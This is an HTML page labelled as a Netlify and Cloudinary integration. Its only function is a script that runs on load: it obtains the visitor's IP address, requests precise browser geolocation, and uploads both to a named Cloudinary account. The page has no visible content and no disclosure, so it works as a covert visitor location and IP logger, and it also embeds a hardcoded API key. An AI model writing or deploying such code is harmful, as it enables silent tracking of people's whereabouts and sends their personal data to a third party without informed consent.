<!DOCTYPE html>
<html>
<head>
  <title>Netlify + Cloudinary Integration</title>
</head>
<body>
  <script>
    // IPアドレスの取得（Netlify Functionを使用）
    fetch('/.netlify/functions/getIpAddress')
      .then(response => response.text())
      .then(ipAddress => {
        console.log('IP Address:', ipAddress.trim());

        // 位置情報の取得
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // CloudinaryのAPIキー
          const cloudinaryApiKey = '965591649852323';

          // ファイルデータの作成
          const fileData = new FormData();
          fileData.append('file', new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}`], { type: 'text/plain' }));
          fileData.append('upload_preset', 'your_upload_preset'); // Cloudinaryのアップロードプリセットを設定

          // Cloudinaryにファイルをアップロード
          fetch(`https://api.cloudinary.com/v1_1/dxzsajngl/upload`, {
            method: 'POST',
            body: fileData
          })
          .then(response => response.json())
          .then(data => {
            console.log('File uploaded to Cloudinary:', data);
            // ファイルがアップロードされた後の処理をここに追加
          })
          .catch(error => {
            console.error('Error uploading file to Cloudinary', error);
          });
        });
      })
      .catch(error => {
        console.error('Error getting IP address', error);
      });
  </script>
</body>
</html>
